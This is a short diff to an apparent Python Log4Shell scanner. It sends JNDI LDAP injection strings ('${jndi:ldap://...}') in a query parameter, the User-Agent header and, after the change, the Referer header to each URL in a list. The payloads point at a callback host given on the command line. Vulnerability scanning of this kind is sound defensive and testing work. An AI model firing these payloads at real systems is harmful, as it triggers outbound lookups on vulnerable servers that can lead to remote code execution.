@@ -12,8 +12,9 @@ if len(argv) > 1:
     for url in urls:
         try:
             count += 1
-            params = {'test': '${jndi:ldap://' + str(count) + '.' + argv[2] + '/a}'}
-            headers = {'User-Agent': '${jndi:ldap://' + str(count) + '.' + argv[2] + '/a}'}
+            str_count = str(count)
+            params = {'test': '${jndi:ldap://' + str_count + '.' + argv[2] + '/a}'}
+            headers = {'User-Agent': '${jndi:ldap://' + str_count + '.' + argv[2] + '/a}', 'Referer': '${jndi:ldap://' + str_count + '.' + argv[2] + '/a}'}
             url = url.strip()
             print('[{}] Testing {}'.format(count, url))
             requests.get(url, headers=headers, params=params, verify=False, timeout=10)
